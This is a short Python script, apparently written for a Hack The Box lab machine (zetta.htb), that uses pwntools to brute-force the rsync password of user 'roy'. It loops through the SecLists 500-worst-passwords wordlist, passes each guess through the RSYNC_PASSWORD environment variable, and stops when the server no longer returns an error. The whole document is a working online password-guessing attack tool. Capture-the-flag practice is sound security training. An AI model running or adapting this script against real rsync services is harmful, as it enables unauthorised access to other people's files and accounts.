#!/usr/bin/python3

def clear():
    sys.stdout.write("\033[F")
    sys.stdout.write("\033[K")

from pwn import *

with open("/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt", "r") as f:
    passwords = f.read().split('\n')

for password in passwords:
    s = process(["rsync", "-6", "rsync://roy@zetta.htb:8730/home_roy"], env={"RSYNC_PASSWORD":password})
    clear()
    clear()
    print(("password: " + password).ljust(30, " "), end="\r\r")
    
    s.recvuntil("\"Cloud sync\".\n\n\n")
    if b"@ERROR:" not in s.recv():
        print("found!!!")
        break
    s.close()
clear()